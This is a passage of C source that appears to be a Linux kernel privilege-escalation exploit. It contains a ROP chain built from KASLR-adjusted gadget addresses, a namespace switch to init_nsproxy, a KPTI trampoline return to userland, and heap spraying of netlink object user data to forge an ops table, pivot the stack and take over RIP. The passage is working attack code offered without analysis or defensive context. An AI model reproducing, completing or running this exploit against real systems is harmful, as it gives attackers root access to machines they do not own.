    rop[pos++] = kaslr_slide + 0xffffffff8102e2a6; // pop rsi; ret;
    rop[pos++] = kaslr_slide + INIT_NSPROXY;
    rop[pos++] = kaslr_slide + SWITCH_TASK_NAMESPACES;

    // Return to userland
    save_state();
    rsp &= ~0xf;
    rsp += 8;
    rop[pos++] = kaslr_slide + KPTI_TRAMPOLINE;
    rop[pos++] = 0x0; // dummy rax
    rop[pos++] = 0x0; // dummy rdi
    rop[pos++] = post_exploit;
    rop[pos++] = cs;
    rop[pos++] = rflags;
    rop[pos++] = rsp;
    rop[pos] = ss;

    // Send ROP in object udata
    del_obj(nl, "spray-0");
    wait_destroyer();
    obj_spray(nl, 1, 1, rop, 0xb8);
    fake_obj = (uint64_t *)getudata(nl, "spray-3");
    DumpHex(fake_obj, 0xe8);
    uint64_t rop_addr = fake_obj[9];
    printf("[*] ROP addr: 0x%lx\n", rop_addr);

    // Point to fake ops
    fake_obj[16] = rop_addr - 0x20; // Point ops to fake ptr table

    // Stack pivot
    uint64_t trampoline = kaslr_slide + 0xffffffff810db7e0;
    memcpy(((uint8_t *)fake_obj) + 0x39, &trampoline, sizeof(uint64_t));
    fake_obj[0] = kaslr_slide + 0xffffffff810db7e0; // pop rsp; ret
    fake_obj[1] = rop_addr + 0x18;                  // Jump to ROP

    // Gadget to read return
    fake_obj[28] = kaslr_slide + 0xffffffff8112c7c0; // pop rdi; ret;

    // Write ROP
    puts("[*] Write ROP");
    deludata_spray(nl, 3, 1);
    wait_destroyer();
    udata_spray(nl, 0xe8, 4, 1, fake_obj);

    // Takeover RIP
    puts("[*] Takeover RIP");
    debug();
    dump_obj(nl, "spray-1");

    sleep(13371337);
    return 0;
}

int main(int argc, char *argv[])
{
    // exploit initialization
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    srand(time(NULL));

    unshare_setup(getuid(), getgid());
    set_cpu_affinity(0, 0);

    struct sigaction sa;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);
    sa.sa_handler = handler;
    if(sigaction(SIGSEGV, &sa, NULL) < 0){
        perror("[-] sigaction");
    }

    main_cg(argc, argv);
    return 0;
}